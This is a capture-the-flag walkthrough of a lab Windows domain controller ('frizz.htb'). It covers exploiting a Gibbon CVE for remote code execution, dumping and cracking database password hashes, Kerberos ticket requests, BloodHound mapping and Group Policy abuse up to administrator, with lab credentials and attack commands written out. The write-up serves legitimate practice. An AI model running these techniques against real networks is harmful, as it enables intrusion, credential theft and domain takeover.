![](Pasted%20image%2020250412202324.png)
# A.  Service Enumeration
| IP  | Port                                                                                   |
| --- | -------------------------------------------------------------------------------------- |
| TCP | 22,53,80,88,135,139,389,445,464,636,3268,3269,9389,49664,49667,49670,52427,52431,52440 |
| UDP | 53,88,125                                                                              |
## 1. TCP Active Port
![](Pasted%20image%2020250412205821.png)
-sV
![](Pasted%20image%2020250415093944.png)
## 2. UDP Active Port
![](Pasted%20image%2020250415093326.png)
## 3. Domain
```
LOCALHOST -> FRIZZDC
LDAP Domain -> frizz.htb0.
WEb Domain -> frizzdc.frizz.htb
```
# B. Initial Access
## 1. Web - frizzdc.frizz.htb
![](Pasted%20image%2020250415093433.png)

Web used Gibbon **v25.0.00**, lets check the cve🔥
### a. Default Password
nope
### b. Searchsploit
![](Pasted%20image%2020250415094441.png)
need credentials
### c. Dorking
#### - CVE-2023-34598
https://github.com/maddsec/CVE-2023-34598
![](Pasted%20image%2020250415100932.png)
#### - CVE-2023-45878
RCE
https://github.com/davidzzo23/CVE-2023-45878 -> not work
https://github.com/killercd/CVE-2023-45878.git -> work, but it hard to running reverse shell from here

![](Pasted%20image%2020250415133256.png)
https://github.com/0xyy66/CVE-2023-45878_to_RCE.git  -> work
![](Pasted%20image%2020250415140015.png)
![](Pasted%20image%2020250415140036.png)
## 2. Windows Shell exploration
```
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';

```
![](Pasted%20image%2020250415142540.png)
## 3. Access mysql db
```
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E
```
![](Pasted%20image%2020250417104239.png)
```
username
f.frizzle

Password Hash
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03

Password Salt
/aACFhikmNopqrRTVz2489

email
f.frizzle@frizz.htb
```
## 4. Crack hash
Identified hash
![](Pasted%20image%2020250417125631.png)
search hash format on google "gibbon" "hash", and found this
![](Pasted%20image%2020250417135706.png) 
check format on hashcat
![](Pasted%20image%2020250417140002.png)
![](Pasted%20image%2020250417140251.png)
```
Jenni_Luvs_Magic23
```
## 5. Use the Credentials
```
f.frizzle
Jenni_Luvs_Magic23
```
creat kbr5.conf
![](Pasted%20image%2020250417160709.png)
generate ticketing
```
ntpdate frizzdc.frizz.htb  
impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb  
export KRB5CCNAME=f.frizzle.ccache
ssh f.frizzle@frizz.htb -K
```
![](Pasted%20image%2020250417160819.png)
get user flag
# C. Privilege Escalation
## 1. Shell Exploration
Users
![](Pasted%20image%2020250418214006.png)
whoami all/
![](Pasted%20image%2020250418214254.png)

## 2. Bloodhound
genertate data passwordnya kerberos -> not works
![](Pasted%20image%2020250418215342.png)
generate againt with password string -> works tapi bedaaa hasilnya
![](Pasted%20image%2020250419135635.png)
generate again using sharphound.exe
![](Pasted%20image%2020250421101300.png)
```
SharpHound.exe --CollectionMethods All --ZipFileName output.zip
```
![](Pasted%20image%2020250421101347.png)
move the zip file to our local system
```
scp f.frizzle@frizz.htb:./20250329024808_output.zip result.zip
```
search for administrator group and look for group member-direct member, click that. It tells us for access administrator, we can use m.schoolbus@frizz.htb
![](Pasted%20image%2020250421102502.png)
After exploring BloodHound, we found a misconfiguration: GPO Abuse. Only the Administrator should be in the **Group Policy Creator Owners** group, but **M.SchoolBuz@Frizz.htb** is also a member by mistake. This means if we obtain the credentials for **m.schoolbuz**, we can escalate privileges to Administrator.
![](Pasted%20image%2020250421104810.png)

try to explore recyble bin, and found 7z file
![](Pasted%20image%2020250421130403.png)

copy the file to local machine
![](Pasted%20image%2020250421130527.png)
## 3. Wapt
extract the 7z file
![](Pasted%20image%2020250421130636.png)
![](Pasted%20image%2020250421130904.png)
```
cat wapt-get.ini.tmpl

...
;wapt_user=admin
;wapt_password=5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
;waptservice_port=8088
...
```
![](Pasted%20image%2020250421131004.png)

another crendetial
![](Pasted%20image%2020250421132415.png)
```
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
```

decode base64
![](Pasted%20image%2020250421132620.png)
```
!suBcig@MehTed!R
```
check what account is used that password, fortunately this is m.schoolbus password yeeeee
![](Pasted%20image%2020250421134049.png)
generate tickeing kerberos for account m.schoolbus and successfully access the shell
![](Pasted%20image%2020250421134513.png)

## 4. Abusing GPO
show GPO
![](Pasted%20image%2020250421140550.png)
make new GPO
![](Pasted%20image%2020250421141039.png)
Check new GPO that recently we've made
![](Pasted%20image%2020250421141116.png)
scp sharpgpo abuse anda runassc to target machine
https://github.com/byronkg/SharpGPOAbuse
https://github.com/antonioCoco/RunasCs/releases/tag/v1.5

![](Pasted%20image%2020250422043705.png)

Run SharpGPOAbuse for make m.schoolbus have same privilege with administrator
![](Pasted%20image%2020250422045747.png)

Run runascs for get shell of administrator, dont forget set up listener
![](Pasted%20image%2020250422050246.png)

Successfully get root.txt
![](Pasted%20image%2020250422050327.png)
# D. Post Exploitation
## 1. User Flag
Medium
## 2. Root Flag
Medium
